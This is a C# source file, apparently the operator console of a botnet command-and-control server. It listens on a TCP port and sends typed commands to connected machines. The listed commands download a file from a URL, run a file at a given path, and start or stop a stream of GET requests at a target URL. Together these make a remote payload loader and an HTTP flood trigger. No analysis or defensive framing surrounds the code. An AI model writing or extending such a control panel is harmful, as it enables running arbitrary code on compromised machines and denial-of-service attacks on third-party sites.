using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

class ControlPanel
{
    private static TcpListener server;
    private static TcpClient client;
    private static NetworkStream stream;
    private static int port = 12345; // Порт сервера

    static void Main(string[] args)
    {
        StartServer();

        while (true)
        {
            client = server.AcceptTcpClient();
            stream = client.GetStream();

            // Обработка клиента
            HandleClient();
        }
    }

    private static void StartServer()
    {
        server = new TcpListener(IPAddress.Any, port);
        server.Start();
        Console.WriteLine("Server started on port " + port);
    }

    private static void HandleClient()
    {
        while (true)
        {
            Console.WriteLine("Available commands:");
            Console.WriteLine("download <url> <path> - Download a file from a URL to a specified path");
            Console.WriteLine("run <path> - Run a file from a specified path");
            Console.WriteLine("get <url> - Start sending GET requests to a specified URL");
            Console.WriteLine("stop - Stop sending GET requests");
            Console.Write("Enter command: ");
            string command = Console.ReadLine();
            SendCommand(command);
        }
    }

    private static void SendCommand(string command)
    {
        byte[] data = Encoding.ASCII.GetBytes(command);
        stream.Write(data, 0, data.Length);
    }
}
